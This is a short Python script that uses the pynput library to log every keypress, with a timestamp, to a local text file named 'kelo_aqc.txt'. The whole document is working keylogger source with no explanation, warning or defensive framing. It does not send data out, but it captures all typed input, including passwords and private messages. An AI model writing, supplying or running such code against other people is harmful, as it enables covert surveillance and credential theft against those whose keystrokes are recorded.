from pynput import keyboard
from datetime import datetime

def on_press(key):
    timestamp = datetime.now().isoformat()
    try:
        with open("kelo_aqc.txt", "a") as f:
            if key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"{timestamp} - {key}\n")
    except Exception as e:
        print(f"Error: {e}")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()